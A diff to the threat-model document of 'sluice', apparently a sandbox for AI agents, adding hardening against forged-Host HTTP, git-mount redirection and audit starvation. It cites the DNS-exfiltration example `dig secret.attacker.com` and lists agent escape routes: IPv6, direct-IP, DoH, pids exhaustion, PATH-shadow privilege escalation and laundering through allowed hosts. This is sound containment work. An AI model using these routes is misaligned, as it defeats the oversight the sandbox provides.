@@ -78,8 +78,10 @@ The guarantees below hold only while these do:
   `disable_ipv6` set, or `ip6tables` `OUTPUT` `DROP`) - so a silently-failed default-DROP can't leave
   egress open while the box reports `ready`.
 - **IP-literal / DNS / IPv6 bypasses** -> a direct-IP HTTPS connection has no SNI ->
-  terminated; IPv6 is disabled entirely (we proxy v4 only, so a dual-stack app can't slip out over
-  v6). **DNS resolution is scoped to the egress allowlist**: dnsmasq forwards only allowlisted names,
+  terminated; an intercepted plaintext-HTTP request is allowed by `Host`, which squid verifies against
+  the IP the client actually connected to (`host_verify_strict`), so a forged `Host: <allowlisted>` to
+  an arbitrary IP is refused; IPv6 is disabled entirely (we proxy v4 only, so a dual-stack app can't
+  slip out over v6). **DNS resolution is scoped to the egress allowlist**: dnsmasq forwards only allowlisted names,
   and the firewall lets only it (not app code) reach a resolver - so an agent can't tunnel exfil as
   DNS labels to an off-allowlist authoritative nameserver (`dig secret.attacker.com`): a non-allowlisted
   name is answered locally with a dead sink (`192.0.2.1`, never forwarded), so the query never reaches
@@ -93,7 +95,9 @@ The guarantees below hold only while these do:
   firewall opens a matching inbound ACCEPT for just those ports.
 - **Reading/altering the rest of your machine** -> only the project dir (and its git
   common dir, for worktrees) is mounted. Nothing else is visible by default; `SLUICE_MOUNTS`,
-  `SLUICE_STATE_DIRS`, and `SLUICE_OVERLAY_DIRS` add only what the config author lists.
+  `SLUICE_STATE_DIRS`, and `SLUICE_OVERLAY_DIRS` add only what the config author lists. The git
+  common-dir mount is taken only when the worktree linkage verifies back to *this* repo, so a box that
+  rewrites its own (writable) `.git` to point elsewhere can't redirect the mount at an unrelated repo.
 - **Reading in-repo secrets (opt-in mask)** -> the project dir is mounted read-write,
   *including* its own `.env`/key files - "can't read your secrets" historically meant files
   *outside* the repo. `SLUICE_MASK` closes the in-repo gap: matching files get an empty
@@ -208,7 +212,9 @@ checks the chain). Precisely what that buys:
 - **Captured host-side from squid's log.** The launcher reads the proxy's access log as root over
   `exec`; the in-box workload (uid 1000) can write neither that log nor the host-side store, so it
   cannot forge or erase a reached/blocked entry. The attestation is bounded by squid-log integrity,
-  not by the workload behaving.
+  not by the workload behaving. If the in-box read itself can't run (e.g. the workload exhausts the
+  pids cgroup so `exec` can't fork), the receipt records an explicit `unavailable` and `sluice egress`
+  exits non-zero (the `SLUICE_EGRESS_MAX_BYTES` gate fails closed) rather than reading as zero egress.
 - **Tamper-evident, not tamper-proof.** The `prev`/`self` hash chain makes any edit, reorder, or
   deletion of a *past* record detectable by `--verify`; it does not stop a host with write access from
   rebuilding the whole chain. For non-repudiation, `--export` records into a store the producer can't
@@ -219,8 +225,9 @@ checks the chain). Precisely what that buys:
 
 ## Residual risk, one line
 
-Egress is **hostname-filtered** (squid splice) with IPv6 off, direct-IP blocked, and **DNS scoped to
-the allowlist**, so the IP-rotation / direct-IP / DoH / DNS-label / v6 gaps are closed. The remaining
+Egress is **hostname-filtered** (squid splice) with IPv6 off, direct-IP and forged-Host HTTP blocked,
+and **DNS scoped to the allowlist**, so the IP-rotation / direct-IP / forged-Host / DoH / DNS-label / v6
+gaps are closed. The remaining
 sharp edge is **allowed-host laundering**: because we splice (never decrypt), data hidden in a request
 to an *allowed* host isn't inspected. Keep `SLUICE_ALLOW_DOMAINS`/`SLUICE_ALLOW_IPS` minimal (the
 latter port-scoped) and never allow a host an attacker can also write to - `sluice` flags such a host
@@ -235,5 +242,8 @@ _Last reviewed 2026-06-11 against sluice 0.8.0 (released) + the post-release har
 (default-superset / browser / audit), the egress work (allowlist-scoped DNS, port-scoped + validated
 `SLUICE_ALLOW_IPS`, laundering-host gate, durable egress receipt + `SLUICE_EGRESS_MAX_BYTES`), in-repo
 secret masking (`SLUICE_MASK`), the DoH-filtered live `learn` reload, the stripped-setuid base, and the
-boot self-test's default-DROP policy assertions. Revisit when the egress path, mount model, or runtime
-options change._
+boot self-test's default-DROP policy assertions. Hardened 2026-06-13 from an adversarial audit:
+clean-PATH root execs (no uid-1000 PATH-shadow privesc), `host_verify_strict` (forged-Host HTTP),
+validated worktree common-dir mount, case-insensitive + wildcard-coverage DoH filter, fail-closed egress
+audit, sanitized `doctor` output, policy deny over a covering allow wildcard, and the IPv6-closed
+disjunction. Revisit when the egress path, mount model, or runtime options change._
